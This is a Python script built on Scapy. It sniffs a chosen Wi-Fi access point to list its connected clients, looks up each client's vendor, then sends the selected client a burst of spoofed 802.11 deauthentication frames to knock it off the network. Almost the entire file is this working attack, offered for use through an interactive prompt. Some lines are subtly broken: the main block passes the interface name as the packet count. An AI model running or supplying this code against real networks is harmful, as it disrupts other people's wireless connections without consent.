from scapy.all import *
from tabulate import tabulate
import time
import threading

INTERFACE="wlp2s0"

def countdown(seconds, stop_event):
        """מדפיס כל שניה כמה שניות נותרו לסיום הסריקה"""
        for remaining in range(seconds, 0, -1):
            if stop_event.is_set():
                break
            print(f"\r⏱  Scanning... {remaining:3d}s remaining", end='', flush=True)
            time.sleep(1)
        print("\r⏱  Scanning... done!")

def scan_clients_of_ap(bssid, timeout=100):
    """
    Scans for clients connected to a specific BSSID using Scapy.
    Returns a dict of {client_mac: {"RSSI": ..., "Vendor": ...}}.
    """
    clients = {}
    stop_event = threading.Event()

    def handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 2:  # Data frame
                if pkt.addr1 and pkt.addr2:
                    if bssid in [pkt.addr1, pkt.addr2, pkt.addr3]:
                        mac = pkt.addr1 if pkt.addr1 != bssid else pkt.addr2
                        if mac and mac != bssid and mac != "ff:ff:ff:ff:ff:ff":
                            rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
                            clients[mac] = {
                                "RSSI": rssi,
                                "Vendor": get_vendor(mac)
                            }

    print(f"🔍 Scanning for clients of BSSID {bssid} on interface {INTERFACE} for {timeout} seconds...")

    timer_thread = threading.Thread(target=countdown, args=(timeout, stop_event), daemon=True)
    timer_thread.start()

    sniff(iface=INTERFACE, prn=handler, timeout=timeout, store=0)

    stop_event.set()  
    return clients

def get_vendor(mac):
    try:
        prefix = mac.upper()[0:8]
        oui_output = subprocess.check_output(['grep', prefix, '/usr/share/ieee-data/oui.txt'], text=True)
        return oui_output.strip().split('\t')[-1]
    except:
        return "Unknown"

def send_deauth_to_client(bssid, count=100, interval=0.1):
    """
    Scans clients of a given AP, displays them, lets user choose one, and sends deauth.
    """
    clients = scan_clients_of_ap(bssid)

    if not clients:
        print("❌ No clients found.")
        return

    client_list = list(clients.items())
    table = []
    for i, (mac, data) in enumerate(client_list):
        table.append([i, mac, data["RSSI"], data["Vendor"]])

    print("\n📡 Connected clients:")
    print(tabulate(table, headers=["#", "MAC Address", "RSSI", "Vendor"], tablefmt="grid"))

    try:
        index = int(input("\n👤 Choose client number to deauth: "))
        target_mac = client_list[index][0]
    except (ValueError, IndexError):
        print("❌ Invalid selection.")
        return

    print(f"[!] Sending deauth packets to {target_mac} from {bssid}...")
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    sendp(pkt, iface=INTERFACE, count=count, inter=interval, verbose=1)
    print("✅ Deauth attack completed.")

# Example usage
if __name__ == "__main__":
    bssid = input("📶 Enter BSSID of target AP: ")
    send_deauth_to_client(bssid, INTERFACE)
